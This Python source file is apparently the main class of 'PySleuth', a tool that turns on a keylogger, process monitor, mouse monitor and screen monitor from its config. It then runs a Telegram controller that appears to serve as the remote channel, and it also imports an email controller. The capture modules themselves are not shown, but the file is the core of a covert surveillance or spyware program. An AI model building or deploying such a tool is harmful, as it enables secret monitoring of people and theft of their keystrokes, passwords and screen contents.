from .controllers.components import KeyLoggerController, ProcessMntrController, MouseMntrController, ScreenMntrController
from .controllers.email import EmailController
from .controllers.telegram import TelegramController
from .core import output
from . import config

logger = output.Loggers.getMaster(__name__)


class Struct:
    pass


class PySleuth:
    RUNNING = False

    def __init__(self):
        self.ctrls = Struct()
        self._initComponents()

        self.telegramCtrl = TelegramController(self)

        self.connectSlots()

        logger.info("Firing up ...")

    def start(self):
        self.RUNNING = True

        assert self.telegramCtrl is not None

        try:
            self.telegramCtrl.startWorker()  # blocking !
        except KeyboardInterrupt:
            logger.error("User abort!", exc_info=True)
        except Exception as e:
            logger.critical("Uncaugh exception", exc_info=True)
        finally:
            self.onShutdown()

    def onShutdown(self):
        if self.RUNNING:
            self.RUNNING = False

        assert not self.RUNNING

        logger.info("Shutting down")

    def __del__(self):
        self.onShutdown()

    def connectSlots(self):
        self.telegramCtrl.SIG_shutdown.connect(self, "onShutdown")

    def _initComponents(self):
        cfg = config.get()

        if cfg.keylogger.enable:
            self._initKeylogger()

        if cfg.processMntr.enable:
            self._initProcessMonitor()

        if cfg.mouseMntr.enable:
            self._initMouseMonitor()

        if cfg.screenMntr.enable:
            self._initScreenMonitor()

    def _initKeylogger(self):
        setattr(self.ctrls, "keyloggerctrl", KeyLoggerController())

    def _initProcessMonitor(self):
        setattr(self.ctrls, "procMntrCtrl", ProcessMntrController())

    def _initMouseMonitor(self):
        setattr(self.ctrls, "mouseMntrCtrl", MouseMntrController())

    def _initScreenMonitor(self):
        setattr(self.ctrls, "screenMntrCtrl", ScreenMntrController())
